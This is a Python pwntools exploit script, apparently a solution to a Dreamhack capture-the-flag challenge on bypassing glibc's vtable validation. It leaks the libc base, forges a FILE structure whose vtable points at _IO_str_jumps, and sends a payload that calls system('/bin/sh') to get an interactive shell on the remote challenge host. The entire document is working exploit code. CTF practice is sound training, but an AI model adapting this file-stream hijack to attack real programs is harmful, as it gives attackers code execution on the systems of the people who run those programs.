#!/usr/bin/env python3

from pwn import *

exe = ELF("./bypass_valid_vtable_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHESLL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host8.dreamhack.games", 13385)

    return r


def main():
    p = conn()
    # 0xfbad2887
    # 0xfbad0800
    p.recvuntil (b'stdout: ')
    stdout = p.recvline()[:-1]
    stdout = int (stdout.decode(), 16)
    libc.address = stdout - libc.sym['_IO_2_1_stdout_']
    print ("The address of libc is: ", hex (libc.address))

    bin_sh = next (libc.search (b'/bin/sh'))
    old_blen = bin_sh - 100
    old_blen //= 2



    fake_fp = FileStructure()
    fake_fp.flags = 0xfbad0800
    fake_fp._lock = libc.symbols['_IO_stdfile_0_lock']
    
    fake_fp._IO_buf_end = old_blen
    fake_fp._IO_buf_base = 0
    
    fake_fp._IO_write_base = 0
    fake_fp._IO_write_ptr = old_blen + 1
    
    fake_fp._vtable_offset = 0
    fake_fp.vtable = libc.symbols['_IO_str_jumps'] + 0x8


    # payload = b'A' * 300
    # p.sendafter (b'Data: ', payload)
    
    p.sendafter (b'Data: ', bytes (fake_fp) + p64 (libc.sym['system']))
    
    p.interactive()


if __name__ == "__main__":
    main()
